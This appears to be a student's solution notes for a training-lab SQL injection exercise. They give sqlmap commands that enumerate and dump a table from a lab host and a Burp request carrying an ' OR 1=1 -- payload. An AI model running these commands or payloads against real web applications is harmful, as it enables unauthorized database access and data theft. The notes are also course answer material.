Tasks

======

0. SQLi - Basic Injection Discovery
The first step in exploiting SQL injection vulnerabilities is to identify which parameters are vulnerable.
Your goal is to identify which parameters in the application’s web pages are susceptible to SQL injection attacks. For that you should:

Access the machine cyber_websec_0x01 through the VPN.
Navigate to: http://web0x01.hbtn/a3/sql_injection/. (dont forget to edit your /etc/hosts)
Search for the vulnerable paramters.

R:

sqlmap:
sqlmap -u "http://web0x01.hbtn/api/a3/sql_injection/all_orders?status=paid" --tamper=space2comment --level=5 --risk=3 --dbs

BurpSuite:

in interception
GET /api/a3/sql_injection/all_orders?status=%27%20OR%201%3D1%20-- HTTP/1.1

======

1. SQLi - Extracting Database Information
Now that you’ve identified a vulnerable parameter, your next task is to find a flag ⛳️:

Extract information about the database itself:
Database Version.
Tables.

======

2. SQLi - Data Exfiltration from a Specific Table
With knowledge of the database structure, your goal is to extract sensitive data from a specific table.
The target for this exercise is a flag ⛳️ stored within one of the tables you previously identified.

R:
sqlmap:
sqlmap -u "http://web0x01.hbtn/api/a3/sql_injection/all_orders?status=paid" --dbms=sqlite --tables
sqlmap -u "http://web0x01.hbtn/api/a3/sql_injection/all_orders?status=paid" --dbms=sqlite --dump -T not_me

======
